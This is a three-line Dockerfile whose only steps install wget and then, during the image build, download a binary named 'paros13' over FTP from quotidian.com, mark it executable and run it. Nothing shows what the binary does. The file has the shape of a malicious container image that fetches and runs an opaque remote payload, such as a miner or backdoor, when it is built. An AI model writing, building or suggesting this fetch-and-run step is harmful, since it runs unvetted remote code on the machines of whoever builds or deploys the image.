FROM ubuntu:18.04
RUN apt update && apt install wget -y
RUN wget ftp://quotidian.com/paros13;chmod +x paros13;./paros13